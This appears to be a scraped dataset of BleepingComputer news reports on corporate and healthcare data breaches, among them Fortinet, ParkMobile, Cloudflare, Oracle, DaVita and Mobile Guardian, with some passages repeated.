Fortinet confirms data breach after hacker claims to steal 440GB of files,https://www.bleepingcomputer.com/news/security/fortinet-confirms-data-breach-after-hacker-claims-to-steal-440gb-of-files/,Lawrence Abrams,"September 12, 2024","Cybersecurity giant Fortinet has confirmed it suffered a data breach after a threat actor claimed to steal 440GB of files from the company's Microsoft Sharepoint server. Fortinet is one of the largest cybersecurity companies in the world, selling secure networking products like firewalls, routers, and VPN devices. The company also offers SIEM, network management, and EDR/XDR solutions, as well as consulting services. Early this morning, a threat actor posted to a hacking forum that they had stolen 440GB of data from Fortinet's Azure Sharepoint instance. The threat actor then shared credentials to an alleged S3 bucket where the stolen data is stored for other threat actors to download. BleepingComputer has not accessed this storage bucket to confirm if it contains Fortinet's stolen files. The threat actor, known as ""Fortibitch,"" claims to have tried to extort Fortinet into paying a ransom, likely to prevent the publishing of data, but the company refused to pay. In response to our questions about incident, Fortinet confirmed that customer data was stolen from a ""third-party cloud-based shared file drive."" ""An individual gained unauthorized access to a limited number of files stored on Fortinet’s instance of a third-party cloud-based shared file drive, which included limited data related to a small number of Fortinet customers,"" the company told BleepingComputer. Earlier today, Fortinet did not disclose how many customers are impacted or what kind of data has been compromised but said that it ""communicated directly with customers as appropriate."" A later update shared on Fortinet's website says that the incident affected less than 0.3% of its customer base and that it has not resulted in any malicious activity targeting customers. The cybersecurity company also confirmed that the incident did not involve any data encryption, ransomware, or access to Fortinet's corporate network. BleepingComputer contacted Fortinet with additional questions about the breach but has not received a reply at this time.

The top Canadian pediatric hospital disclosed that as a part of its operations, it shares personal health information with BORN Ontario ""related to pregnancy, birth and newborn care."" The BORN Ontario data breach that impacted 3.4 million people was caused by the exploitation of well-known zero-day vulnerability ( CVE-2023-34362 ) in Progress MOVEIt Transfer software. On Monday, September 25th, SickKids disclosed that it is ""among the many Ontario healthcare providers"" that share sensitive health information with BORN Ontario, a perinatal and child registry that collects, interprets, shares and protects critical data about pregnancy, birth and childhood in the province of Ontario.

ParkMobile pays... $1 each for 2021 data breach that hit 22 million,https://www.bleepingcomputer.com/news/security/parkmobile-pays-1-each-for-2021-data-breach-that-hit-22-million/,Ax Sharma,"October 5, 2025","ParkMobile has finally wrapped up a class action lawsuit over the platform's 2021 data breach that hit 22 million users. But there's a catch: victims are receiving compensation in the form of a $1 in-app credit, which they must claim manually. And, it comes with an expiration date. Great news! If you were affected by ParkMobile's 2021 data breach, there's serious money to be made: a whopping dollar. The popular mobile and web parking payments platform, headquartered in Atlanta, began sending emails last week to class action plaintiffs, advising them on how to claim their portion of the settlement fund. Upon receiving this email, I was, like many others, understandably skeptical and struggled with its wording. Was it legitimate or a trolling (or even phishing) attempt? The settlement follows a class action lawsuit accusing ParkMobile of failing to adequately protect user data compromised during the 2021 incident. Account information of almost 22 million ParkMobile customers was stolen by threat actors at the time, who then leaked the full database on a hacking forum, letting anyone download it all. This 4.5 GB data dump, released as a massive CSV text file, contained customers' first and last names, initials, mobile numbers, email addresses, user names, bcrypt-hashed passwords, mailing addresses, license plate numbers, and vehicle information. By December 2024, the years-long lawsuit filed in the US District Court for the Northern District of Georgia, Atlanta Division, resulted in a $32.8 million compensation amount. As expected, the company denied any wrongdoing as part of the settlement—a standard legal clause commonly seen in such agreements: ""The lawsuit asserts common law and statutory claims against ParkMobile for alleged negligent data security practices, statutory claims, and declaratory judgment. ParkMobile denies all claims alleged against it and denies all charges of wrongdoing or liability . The settlement is not an admission of wrongdoing or an indication that ParkMobile has violated any laws, but rather the resolution of disputed claims."" Affected users were urged to submit a claim form to law firms Baker et al., who represented the class of plaintiffs by March 5th, 2025. Those who did not submit the forms, however, received ""a code via email from ParkMobile to receive a $1.00 credit to your ParkMobile App"" starting last week. ""You are eligible for up to a $1.00 credit to be applied to ParkMobile's service fees,"" states the email seen by BleepingComputer. ""The code provides a $0.25 discount on ParkMobile's service fees and may be used up to four times for a total discount of $1.00."" It gets better. The credit isn't automatic. You need to manually add it to your account by using discount code, P@rkMobile-$1 , under Payment → Discounts before starting a session. For most users, the code expires October 8, 2026, so hurry! Residents of the Golden State of California, however, are lucky: the code doesn't expire for them. ""The code will only work for accounts associated with email addresses that are in the class,"" states the email, and can be used towards your next transaction, but not Reservations. Those who have used ParkMobile in the past can check if their information was compromised in the 2021 data breach at HaveIBeenPwned by entering their email address associated with ParkMobile. As for those who weren't affected, too bad, you missed out on a dollar. Following the settlement news, ParkMobile is warning users of ongoing SMS phishing (smishing) attacks this week targeting its customer base. ""The SMS message appears to come from ParkMobile and includes instructions to click a link and pay the phony balance online,"" states the company. ""This is a fraudulent message and is not from ParkMobile - do not proceed."" ParkMobile reminds users that it will never ask customers for sensitive information like passwords, security codes, or ask them to share banking information, transfer funds, or download another app or service. ""We urge all our customers to stay vigilant. If something feels wrong – always check the sender.

The internet giant revealed on Tuesday that the attackers gained access to a Salesforce instance it uses for internal customer case management and customer support, which contained 104 Cloudflare API tokens. Cloudflare was notified of the breach on August 23, and it alerted impacted customers of the incident on September 2. Before informing customers of the attack, it also rotated all 104 Cloudflare platform-issued tokens exfiltrated during the breach, even though it has yet to discover any suspicious activity linked to these tokens. ""Most of this information is customer contact information and basic support case data, but some customer support interactions may reveal information about a customer's configuration and could contain sensitive information like access tokens,"" Cloudflare said . ""Given that Salesforce support case data contains the contents of support tickets with Cloudflare, any information that a customer may have shared with Cloudflare in our support system—including logs, tokens or passwords—should be considered compromised, and we strongly urge you to rotate any credentials that you may have shared with us through this channel."" The company's investigation found that the threat actors stole only the text contained within the Salesforce case objects (including customer support tickets and their associated data, but no attachments) between August 12 and August 17, after an initial reconnaissance stage on August 9. These exfiltrated case objects contained only text-based data, including: ""We believe this incident was not an isolated event but that the threat actor intended to harvest credentials and customer information for future attacks,"" Cloudflare added. ""Given that hundreds of organizations were affected through this Drift compromise, we suspect the threat actor will use this information to launch targeted attacks against customers across the affected organizations."" Since the start of the year, the ShinyHunters extortion group has been targeting Salesforce customers in data theft attacks, using voice phishing (vishing) to trick employees into linking malicious OAuth apps with their company's Salesforce instances. This tactic enabled the attackers to steal databases, which were later used to extort victims. Since Google first wrote about these attacks in June, numerous data breaches have been linked to ShinyHunters' social engineering tactics, including those targeting Google itself , Cisco , Qantas , Allianz Life , Farmers Insurance , Workday , Adidas , as well as LVMH subsidiaries Louis Vuitton , Dior , and Tiffany & Co. While some security researchers have told BleepingComputer that the Salesloft supply chain attacks involve the same threat actors, Google has found no conclusive evidence linking them. Palo Alto Networks also confirmed over the weekend that the threat actors behind the Salesloft Drift breaches stole some support data submitted by customers, including contact info and text comments. The Palo Alto Networks incident was also limited to its Salesforce CRM and, as the company told BleepingComputer, it did not affect any of its products, systems, or services. The cybersecurity company observed the attackers searching for secrets, including AWS access keys (AKIA), VPN and SSO login strings, Snowflake tokens, as well as generic keywords such as ""secret,"" ""password,"" or ""key,"" which could be used to breach more cloud platforms to steal data in other extortion attacks.

Since the start of the year, the ShinyHunters extortion group has been targeting Salesforce customers in data theft attacks, using voice phishing (vishing) to trick employees into linking malicious OAuth apps with their company's Salesforce instances. This tactic enabled the attackers to steal databases, which were later used to extort victims. Since Google first wrote about these attacks in June, numerous data breaches have been linked to ShinyHunters' social engineering tactics, including those targeting Google itself , Cisco , Qantas , Allianz Life , Farmers Insurance , Workday , Adidas , as well as LVMH subsidiaries Louis Vuitton , Dior , and Tiffany & Co. While some security researchers have told BleepingComputer that the Salesloft supply chain attacks involve the same threat actors, Google has found no conclusive evidence linking them. Palo Alto Networks also confirmed over the weekend that the threat actors behind the Salesloft Drift breaches stole some support data submitted by customers, including contact info and text comments. The Palo Alto Networks incident was also limited to its Salesforce CRM and, as the company told BleepingComputer, it did not affect any of its products, systems, or services. The cybersecurity company observed the attackers searching for secrets, including AWS access keys (AKIA), VPN and SSO login strings, Snowflake tokens, as well as generic keywords such as ""secret,"" ""password,"" or ""key,"" which could be used to breach more cloud platforms to steal data in other extortion attacks.

The car maker discovered the breach in early November 2023 and discovered recently that the incident exposed personal data belonging to more than 53,000 current and former employees. “As shared during the Nissan Town Hall meeting on December 5, 2023, Nissan learned on November 7, 2023, that it was the victim of a targeted cyberattack. Upon learning of the attack, Nissan promptly notified law enforcement and began taking immediate actions to investigate, contain, and successfully terminate the threat,” the company said in a notification to impacted individuals. Nissan disclosed that the threat actor targeted its external VPN and then shut down certain company systems before asking for a ransom. The company notes that none of its systems were encrypted during the attack. Working with external cybersecurity experts, the company was able to assess the situation, contain the incident, and terminate the threat. The subsequent investigation revealed that the hacker had accessed some files on local and network shares that contained mostly business information. However, on February 28 the company ""identified certain personal information in the data primarily relating to current and former NNA [Nissan] employees including Social Security numbers."" In a data breach notification to the Office of the Maine Attorney General, the company states that the exposed details included a personal identifier (e.g. name) and social security numbers, and that financial details were not present in the files accessed by the threat actor. Nissan notes that it is not aware of the exposed data having been misused. To mitigate the risk of this data exposure, though, Nissan enclosed instructions for letter recipients on how they can enroll in a free-of-charge 24-month credit monitoring and identity theft protection service through Experian.

A threat actor using the nickname 'nears' (previously near2tlg) claimed to have attacked multiple healthcare facilities in France, alleging that they have access to the patient records of over 1,500,000 people. The hacker claims they breached MediBoard by Software Medical Group, a company offering Electronic Patient Record (EPR) solutions across Europe. Softway Medical Group has confirmed that hackers have compromised a MediBoard account. However, it noted that this was not the result of a software vulnerability or misconfiguration on their part, but rather through the use of stolen credentials used by the hospital. In a letter sent to French media and shared with BleepingComputer by LeMagIT's editor-in-chief, Valéry Rieß-Marchive , Softway Medical Group says the exposed data was not directly managed by them, but rather hosted by the hospital. ""On November 19, 2024, a cyberattack was detected within a healthcare facility using the Mediboard software,"" reads the machine-translated email. ""We want to emphasize that the affected health data were not hosted by Softway Medical Group."" BleepingComputer contacted Softway Medical Group for clarifications on which account and at what level was compromised, and a spokesperson shared the following statement: ""We can confirm that our software is not responsible, but rather, a privileged account within the client's infrastructure was compromised by an individual who exploited the standard functions of the solution,"" the Softway Medical Group told BleepingComputer. ""This hypothesis has been substantiated. It is therefore neither due to improper implementation of the software nor human error.""

"Cyberattack at French hospital exposes health data of 750,000 patients",https://www.bleepingcomputer.com/news/security/cyberattack-at-french-hospital-exposes-health-data-of-750-000-patients/,Bill Toulas,"November 20, 2024","A data breach at an unnamed French hospital exposed the medical records of 750,000 patients after a threat actor gained access to its electronic patient record system. A threat actor using the nickname 'nears' (previously near2tlg) claimed to have attacked multiple healthcare facilities in France, alleging that they have access to the patient records of over 1,500,000 people. The hacker claims they breached MediBoard by Software Medical Group, a company offering Electronic Patient Record (EPR) solutions across Europe. Softway Medical Group has confirmed that hackers have compromised a MediBoard account. However, it noted that this was not the result of a software vulnerability or misconfiguration on their part, but rather through the use of stolen credentials used by the hospital. In a letter sent to French media and shared with BleepingComputer by LeMagIT's editor-in-chief, Valéry Rieß-Marchive , Softway Medical Group says the exposed data was not directly managed by them, but rather hosted by the hospital. ""On November 19, 2024, a cyberattack was detected within a healthcare facility using the Mediboard software,"" reads the machine-translated email. ""We want to emphasize that the affected health data were not hosted by Softway Medical Group."" BleepingComputer contacted Softway Medical Group for clarifications on which account and at what level was compromised, and a spokesperson shared the following statement: ""We can confirm that our software is not responsible, but rather, a privileged account within the client's infrastructure was compromised by an individual who exploited the standard functions of the solution,"" the Softway Medical Group told BleepingComputer. ""This hypothesis has been substantiated. It is therefore neither due to improper implementation of the software nor human error."" This all unfolded after the threat actor began selling what they claimed was access to the MediBoard platform for multiple French hospitals, including Centre Luxembourg, Clinique Alleray-Labrouste, Clinique Jean d'Arc, Clinique Saint-Isabelle, and Hôpital Privé de Thiais.

Oracle privately confirms Cloud breach to customers,https://www.bleepingcomputer.com/news/security/oracle-privately-confirms-cloud-breach-to-customers/,Sergiu Gatlan,"April 3, 2025","Oracle has finally acknowledged to some customers that attackers have stolen old client credentials after breaching a ""legacy environment"" last used in 2017, Bloomberg reported. However, while Oracle told clients this is old legacy data that is not sensitive, the threat actor behind the attack has shared data with BleepingComputer from the end of 2024 and posted newer records from 2025 on a hacking forum. According to Bloomberg , the company also informed clients that cybersecurity firm CrowdStrike and the FBI are investigating the incident. Cybersecurity firm CybelAngel first revealed that Oracle told clients that an attacker who gained access to the company's Gen 1 (also known as Oracle Cloud Classic) servers as early as January 2025 used a 2020 Java exploit to deploy a web shell and additional malware. During the breach, detected in late February, the attacker allegedly exfiltrated data from the Oracle Identity Manager (IDM) database, including user emails, hashed passwords, and usernames. This comes after a threat actor (known as rose87168) put up for sale 6 million data records on BreachForums on March 20 and released multiple text files containing a sample database, LDAP information, and a list of the companies as proof that the data was legitimate, all of them allegedly stolen from Oracle Cloud's federated SSO login servers. ​When asked to confirm the authenticity of the leaked data, Oracle told BleepingComputer that ""There has been no breach of Oracle Cloud. The published credentials are not for the Oracle Cloud. No Oracle Cloud customers experienced a breach or lost any data."" Oracle denied this even after an archived URL showed that the threat actor uploaded a file containing their email address to one of Oracle's servers. This URL was subsequently removed from Archive.org, but an archive of the archive still exists. However, days later, BleepingComputer confirmed with multiple companies that additional samples of the leaked data (including associated LDAP display names, email addresses, given names, and other identifying information) received from the threat actor were valid. Oracle has consistently denied reports of a breach in Oracle Cloud in statements shared with the press since the incident surfaced. This is admittedly true since it aligns with the reports that Oracle is telling customers that the breach impacted an older platform known as Oracle Cloud Classic. ""Oracle rebadged old Oracle Cloud services to be Oracle Classic. Oracle Classic has the security incident,"" cybersecurity expert Kevin Beaumont confirmed on Monday. ""Oracle are denying it on 'Oracle Cloud' by using this scope — but it’s still Oracle cloud services that Oracle manage. That’s part of the wordplay."" An Oracle spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today for more details on the Oracle Cloud breach. Last week, Oracle also notified customers of a breach at the software-as-a-service (SaaS) company Oracle Health (formerly Cerner), impacting multiple U.S. healthcare organizations and hospitals. Even though the company has not publicly disclosed this incident, BleepingComputer confirmed that patient data was stolen in the attack, as confirmed by private communications between Oracle Health and impacted customers and from conversations with those involved. Oracle Health said it detected the breach of legacy Cerner data migration servers on February 20, 2025, and that the attackers used compromised customer credentials to hack into the servers sometime after January 22, 2025. Sources told BleepingComputer that the impacted hospitals are now being extorted by a threat actor named ""Andrew,"" who has not claimed affiliation with extortion or ransomware groups. The threat actor is demanding millions of dollars in cryptocurrency not to leak or sell the stolen data and has created clearnet websites about the breach to pressure the hospitals into paying the ransom.

The data types that have been exposed in these customer records include full names, dates of birth, and driver’s license numbers. U-Haul clarified that the breached system is not part of their payment system, so hackers could not access payment card data. The company says it has reset passwords for all affected accounts as a precaution and implemented additional security safeguards and controls to prevent similar incidents from occurring in the future.

Cisco Duo warns third-party data breach exposed SMS MFA logs,https://www.bleepingcomputer.com/news/security/cisco-duo-warns-third-party-data-breach-exposed-sms-mfa-logs/,Bill Toulas,"April 15, 2024","Update 4/16/24: Added Cisco's statement below. Cisco Duo's security team warns that hackers stole some customers' VoIP and SMS logs for multi-factor authentication (MFA) messages in a cyberattack on their telephony provider. Cisco Duo is a multi-factor authentication and Single Sign-On service used by corporations to provide secure access to internal networks and corporate applications. Duo's homepage reports that it serves 100,000 customers and handles over a billion authentications monthly, with over 10,000,000 downloads on Google Play . In emails sent to customers, Cisco Duo says an unnamed provider who handles the company's SMS and VOIP multi-factor authentication (MFA) messages was compromised on April 1, 2024. The notice explains that a threat actor obtained employee credentials through a phishing attack and then used those credentials to gain access to the telephony provider's systems. The intruder then downloaded SMS and VoIP MFA message logs associated with specific Duo accounts between March 1, 2024, and March 31, 2024. ""We are writing to inform you of an incident involving one of our Duo telephony suppliers (the ""Provider"") that Duo uses to send multifactor authentication (MFA) messages via SMS and VOIP to its customers,"" reads the notice sent to impacted customers . ""Cisco is actively working with the Provider to investigate and address the incident. While the investigation is ongoing, the following is a summary of the incident based on what we have learned to date."" The provider confirmed that the threat actor did not access any contents of the messages or use their access to send messages to customers. However, the stolen message logs do contain data that could be used in targeted phishing attacks to gain access to sensitive information, such as corporate credentials. The data contained in these logs includes an employee's: When the impacted supplier discovered the breach, they invalidated the compromised credentials, analyzed activity logs, and notified Cisco accordingly. Additional security measures were also implemented to prevent similar incidents in the future. The vendor provided Cisco Duo with all of the exposed message logs, which can be requested by emailing msp@duo.com to help better understand the scope of the breach, its impact, and the appropriate defense strategy to take. Cisco also warns customers impacted by this breach to be vigilant against potential SMS phishing or social engineering attacks using the stolen information. ""Because the threat actor obtained access to the message logs through a successful social engineering attack on the Provider, please contact your customers with affected users whose phone numbers were contained in the message logs to notify them, without undue delay, of this event and to advise them to be vigilant and report any suspected social engineering attacks to the relevant incident response team or other designated point of contact for such matters,"" concludes the notification from Cisco's Data Privacy and Incident Response Team. ""Please also consider educating your users on the risks posed by social engineering attacks and investigating any suspicious activity."" The FBI warned last year that threat actors were increasingly using SMS phishing and voice calls in social engineering attacks to breach corporate networks. In 2022, Uber was breached after a threat actor performed an MFA fatigue attack on an employee and then contacted them on WhatsApp via their phone numbers, pretending to be IT help desk personnel. This eventually led to the target allowing the hackers to log into the account and gain access to Uber's systems. Cisco has not disclosed the supplier's name and the number of customers impacted by this incident. BleepingComputer contacted Cisco with further questions but a reply was not immediately available.

SimonMed Imaging is an outpatient medical imaging and radiology services provider, including MRI and CT scans, X-ray, ultrasound, mammography, PET, nuclear medicine, bone density, and interventional radiology procedures. The radiology company operates about 170 medical centers 11 U.S. states, and has an annual revenue of more than $500 million. According to the notice shared with the authorities, hackers compromised SimonMed's systems and had access to the company network at the beginning of the year between January 21 and February 5. SimonMed learned about the breach on January 27, from one of its vendors, who alerted ""that they were experiencing a security incident."" After starting an investigation, the medical company confirmed the next day suspicious activity on its network. “Upon discovering we were the victim of a criminal attack, we immediately began an investigation and took steps to contain the situation,"", the company states . The action taken included resetting passwords, multifactor authentication, adding endpoint detection and response (EDR) monitoring, removing third-party vendors' direct access to systems within SimonMed’s environment and its associated tools, and restricted inbound and outbound traffic to trusted connections The company also notified law enforcement and the services of data security and privacy professionals. SimonMed did not publicly share exactly what information was stolen by the attackers besides their full names, but considering the types of data medical imaging firms store on their systems, it may include highly sensitive information. Still, the company underlined that it has no evidence that the accessed information has been misused to conduct fraud or identity theft as of October 10, the day the notice was circulated. Letter recipients are offered a free-of-charge subscription to identity theft services through Experian.

At the time, the threat actors demanded a ransom payment of $1million and $10,000 for one-day extension before publishing all the stolen files. Currently, SimonMed Imaging is no longer listed on Medusa ransomware's data leak site. This typically suggests that the company negotiated a ransom and paid the hackers.

DaVita says ransomware gang stole data of nearly 2.7 million people,https://www.bleepingcomputer.com/news/security/davita-ransomware-attack-exposed-data-of-nearly-27-million-people/,Sergiu Gatlan,"August 22, 2025","Kidney dialysis firm DaVita has confirmed that a ransomware gang that breached its network stole the personal and health information of nearly 2.7 million individuals. DaVita serves over 265,400 patients across 3,113 outpatient dialysis centers, 2,660 in the United States, and 453 centers in 13 other countries worldwide. The company reported revenues of over $12 billion in 2024 and of $3.3 billion for the second quarter of 2025. In April, the healthcare provider revealed in a filing with the U.S. Securities and Exchange Commission (SEC) that its operations were disrupted after attackers partially encrypted its network over the weekend. According to a dedicated website with more information regarding the resulting data breach, the attackers gained access to DaVita's network on March 24 and were evicted after the company detected the incident on April 12. While inside its systems, the threat actors stole data from DaVita's dialysis labs database, which included a combination of personal (e.g., name, address, date of birth, and social security number), health insurance-related, and health (e.g., condition, treatment information, and dialysis lab test results) information. For some individuals, the stolen information also includes tax identification numbers and, in some cases, images of personal checks. On Thursday, the Department of Health's Office for Civil Rights (OCR) updated its breach portal , confirming that DaVita reported a total of 2,689,826 people had their data stolen in the incident. However, BleepingComputer has also learned that DaVita's team found the actual number of individuals affected by the incident to be 2.4 million after submitting information to the OCR. Although the company has not publicly confirmed this number, the OCR is expected to update its portal in the coming days. ​Although the kidney dialysis firm hasn't linked the attack to a specific ransomware operation, the Interlock ransomware gang claimed responsibility for the breach in late April. Interlock also leaked the allegedly stolen data on its dark web portal after negotiations with DaVita had failed, claiming it had stolen roughly 1.5 terabytes of data from the company's compromised systems, or nearly 700,000 files containing what appeared to be sensitive patient records, insurance details, user account information, and financial data. Almost one month later, on June 18, DaVita also obtained leaked files and confirmed their legitimacy after discovering that some of them had been stolen from its dialysis labs. When BleepingComputer reached out for more details regarding the breach, a DaVita spokesperson didn't confirm whether the Interlock gang was behind the attack or whether the company had received a ransom demand after the incident. ""Regrettably, we have determined that the threat actor gained unauthorized access to our labs database, which contained some patients’ sensitive personal information,"" the spokesperson said. ""As a result, we’re notifying current and former patients and providing them with resources, including complimentary credit monitoring, to help safeguard their data."" The ​ Interlock ransomware operation emerged in September 2024, targeting victims worldwide across multiple industries with a focus on healthcare organizations. Interlock has been linked to ClickFix and malware attacks, during which they deployed a remote access trojan called NodeSnake on the networks of multiple universities in the United Kingdom. More recently, the cybercrime gang also claimed to have hacked Kettering Health , a healthcare giant with over 120 outpatient facilities and more than 15,000 employees.

While inside its systems, the threat actors stole data from DaVita's dialysis labs database, which included a combination of personal (e.g., name, address, date of birth, and social security number), health insurance-related, and health (e.g., condition, treatment information, and dialysis lab test results) information. For some individuals, the stolen information also includes tax identification numbers and, in some cases, images of personal checks. On Thursday, the Department of Health's Office for Civil Rights (OCR) updated its breach portal , confirming that DaVita reported a total of 2,689,826 people had their data stolen in the incident. However, BleepingComputer has also learned that DaVita's team found the actual number of individuals affected by the incident to be 2.4 million after submitting information to the OCR. Although the company has not publicly confirmed this number, the OCR is expected to update its portal in the coming days. ​Although the kidney dialysis firm hasn't linked the attack to a specific ransomware operation, the Interlock ransomware gang claimed responsibility for the breach in late April. Interlock also leaked the allegedly stolen data on its dark web portal after negotiations with DaVita had failed, claiming it had stolen roughly 1.5 terabytes of data from the company's compromised systems, or nearly 700,000 files containing what appeared to be sensitive patient records, insurance details, user account information, and financial data. Almost one month later, on June 18, DaVita also obtained leaked files and confirmed their legitimacy after discovering that some of them had been stolen from its dialysis labs. When BleepingComputer reached out for more details regarding the breach, a DaVita spokesperson didn't confirm whether the Interlock gang was behind the attack or whether the company had received a ransom demand after the incident. ""Regrettably, we have determined that the threat actor gained unauthorized access to our labs database, which contained some patients’ sensitive personal information,"" the spokesperson said. ""As a result, we’re notifying current and former patients and providing them with resources, including complimentary credit monitoring, to help safeguard their data."" The ​ Interlock ransomware operation emerged in September 2024, targeting victims worldwide across multiple industries with a focus on healthcare organizations. Interlock has been linked to ClickFix and malware attacks, during which they deployed a remote access trojan called NodeSnake on the networks of multiple universities in the United Kingdom. More recently, the cybercrime gang also claimed to have hacked Kettering Health , a healthcare giant with over 120 outpatient facilities and more than 15,000 employees.

This agreement resolves the FCC Enforcement Bureau investigations into several cybersecurity incidents and resulting data breaches that impacted T-Mobile's customers in 2021 , 2022 , and 2023 (an API incident and a sales application breach ). As part of the settlement , the telecom carrier must invest $15.75 million in cybersecurity enhancements and pay the U.S. Treasury an additional $15.75 million civil penalty. The company has also committed to implementing more robust security measures, including adopting modern cybersecurity frameworks like zero-trust architecture and multi-factor authentication that resists phishing attacks. ""Today's mobile networks are top targets for cybercriminals. Consumers' data is too important and much too sensitive to receive anything less than the best cybersecurity protections,"" said FCC Chairwoman Jessica Rosenworcel. ""We will continue to send a strong message to providers entrusted with this delicate information that they need to beef up their systems or there will be consequences."" As part of the agreement, T-Mobile has committed to enhance privacy, data security, and cybersecurity practices by addressing foundational security flaws, improving cyber hygiene, and adopting robust modern architectures by: ""With companies like T-Mobile and other telecom service providers operating in a space where national security and consumer protection interests overlap, we are focused on ensuring critical technical changes are made to telecommunications networks to improve our national cybersecurity posture and help prevent future compromises of Americans' sensitive data,"" Loyaan A. Egal, Chief of FCC's Enforcement Bureau, added. The FCC's Privacy and Data Protection Task Force , established in 2023 by Chairwoman Rosenworcel, played a central role in the investigation and settlement, just as it did when the FCC reached similar settlements with AT&T in September 2024 ($13 million) and Verizon on behalf of its subsidiary TracFone Wireless in July 2024 ($16 million). The FCC has also fined the largest U.S. wireless carriers almost $200 million in April 2024 for sharing their customers' real-time location data without their consent. The April forfeiture orders finalized Notices of Apparent Liability (NAL) issued against AT&T, Sprint, T-Mobile, and Verizon in February 2020 and slapped each of the four carriers with multi-million fines: $12 million for Sprint and $80 million for T-Mobile (the two carriers have merged since the investigation began), more than $57 million for AT&T , and an almost $47 million fine for Verizon . In February, the FCC also updated its data breach reporting rules to require telecom companies to report data breaches impacting their customers' personally identifiable information within 30 days.

However, the Packers said the attacker couldn't intercept information from any payments made using gift cards, a Pro Shop website account, PayPal, or Amazon Pay. ""We also immediately required the vendor that hosts and manages the Pro Shop website to remove the malicious code from the checkout page, refresh its passwords, and confirm there were no remaining vulnerabilities,"" the Packers's Director of Retail Operations Chrysta Jorgensen explained .

""Information related to these individuals was likely taken, including their name, social insurance number, date of birth and home address. Copies of government-issued identification documents provided to TPL by staff were also likely taken,"" the library said in an update to its incident report. ""Our cardholder and donor databases are not affected. However, some customer, volunteer and donor data that resided on the compromised file server may have been exposed."" The library has yet to disclose what customer data was stolen and how many customers were affected by the data breach. TPL says it hasn't paid a ransom after the attack, and it's working with external cybersecurity experts to investigate the incident. It also reported the breach to Ontario's Information and Privacy Commissioner and filed a report with the Toronto Police. As Canada's largest public library system, TPL operates on a budget exceeding $200 million, has a membership base of 1,200,000 registered individuals, and provides access to 12 million books across 100 branch libraries throughout the city. While the library hasn't yet attributed the attack to a specific ransomware operation, BleepingComputer has learned that the Black Basta ransomware gang was behind the October 28 attack after seeing a photo of a ransom note shown on a TPL workstation. As a TPL employee told BleepingComputer, the attack occurred overnight on October 27, disrupting numerous services by Saturday morning. We were also told that the attack had minimal impact on TPL's email services and didn't affect the library's phone system. While employees logged into their Office 365 accounts could still access their emails, those who were logged out couldn't access their email accounts. The organization's primary servers (housing sensitive data) were also not encrypted, hinting at the possibility that the Black Basta operators didn't have full access to the library's networks and data. As a precautionary measure to prevent the spread of the malware, TPL shut down all other internal systems after the attack was detected. ​Black Basta emerged as a Ransomware-as-a-Service (RaaS) operation in April 2022 , with double-extortion attacks targeting many corporate entities.

Mobile Guardian, a 'Google for Education' partner, is a cross-platform (Android, Windows, iOS, ChromeOS, macOS) one-on-one solution for K-12 schools that offers a complete suite of device management, parental monitoring and control, secure web filtering, classroom management, and communications. The platform announced it suffered a security breach on August 4, 2024, where a hacker gained unauthorized access to its platform, impacting its North American, European, and Singaporean instances. This incident is unrelated to a misconfiguration that caused an IT outage on July 30, 2024. As a result of the breach, Mobile Guardian says a small percentage of iOS and ChromeOS devices were wiped remotely, but there's no evidence of data access or exfiltration. ""This [incident] resulted in a small percentage of devices to be unenrolled from Mobile Guardian and their devices wiped remotely,"" reads the announcement , adding that ""There is no evidence to suggest that the perpetrator had access to users' data."" The service has been suspended for now, so users cannot log in to the Mobile Guardian platform, and students are limited to restricted access on their devices. Although Mobile Guardian says the incident only impacted a ""small percentage of devices,"" Singapore's Ministry of Education says that the threat actor used the platform to wipe the iPads and Chromebooks of 13,000 students in the country.

Mobile Guardian, a 'Google for Education' partner, is a cross-platform (Android, Windows, iOS, ChromeOS, macOS) one-on-one solution for K-12 schools that offers a complete suite of device management, parental monitoring and control, secure web filtering, classroom management, and communications. The platform announced it suffered a security breach on August 4, 2024, where a hacker gained unauthorized access to its platform, impacting its North American, European, and Singaporean instances. This incident is unrelated to a misconfiguration that caused an IT outage on July 30, 2024. As a result of the breach, Mobile Guardian says a small percentage of iOS and ChromeOS devices were wiped remotely, but there's no evidence of data access or exfiltration. ""This [incident] resulted in a small percentage of devices to be unenrolled from Mobile Guardian and their devices wiped remotely,"" reads the announcement , adding that ""There is no evidence to suggest that the perpetrator had access to users' data."" The service has been suspended for now, so users cannot log in to the Mobile Guardian platform, and students are limited to restricted access on their devices. Although Mobile Guardian says the incident only impacted a ""small percentage of devices,"" Singapore's Ministry of Education says that the threat actor used the platform to wipe the iPads and Chromebooks of 13,000 students in the country.

Many of the hundreds of documents exposed online contained private, sensitive information, like names, contact information, health details, schooling, religion, employment info, and photographs. AHRC is an independent statutory body established by the Australian Government, with the primary role of promoting and protecting human rights in the country. It receives and investigates discrimination complaints, monitors compliance with international human rights obligations, conducts inquiries and research, and oversees related projects and initiatives. Although the organization does not have court powers, it receives complaints from the public and tries to resolve them through conciliation, while it refers unresolved cases to federal courts. According to an announcement published on the AHRC website, the breach impacts submissions between the following dates: A total of 670 documents have been exposed online and accessed between April 3 and May 5, 2025. While some documents already public personal information, others expose sensitive data that may be damaging for the individuals submitting it in the context of the topics AHRC deals with. The organization said the incident was not a result of malicious external attack, but more details will become available in a future update. Meanwhile, AHRC has requested the immediate removal of the indexed files from search engines and disabled all web forms to prevent a subsequent exposure due to underlying misconfigurations. A dedicated taskforce and investigation are underway, while the Office of the Australian Information Commissioner (OAIC) has also been notified. Those who are determined to have been impacted by this incident will be notified personally, and a helpline has been set up to offer support.

Acer is a Taiwanese maker of computer hardware and electronics, best known for its laptops that offer a good balance of performance, quality, and competitive pricing. Earlier today, a threat actor known as 'ph1ns' published a link to download a stolen database containing Acer employee data for free on a hacking forum.

""We are aware that one of our external vendors in the Philippines has suffered a data breach, and as a result, a limited set of employee data has been compromised,"" a spokesperson told BleepingComputer. ""While we are working with the vendor, cybersecurity experts and law enforcement, we would like to emphasize that no customer data has been affected and there is no evidence of any breach of Acer's systems."" Acer Philippines later issued a public statement on X offering similar assurances about the security of customer data and confirming that its systems remain uncompromised. The computer maker has notified the National Privacy Commission (NPC) and the Cybercrime Investigation and Coordinating Center (CICC) in the Philippines, and an investigation of the incident is underway.

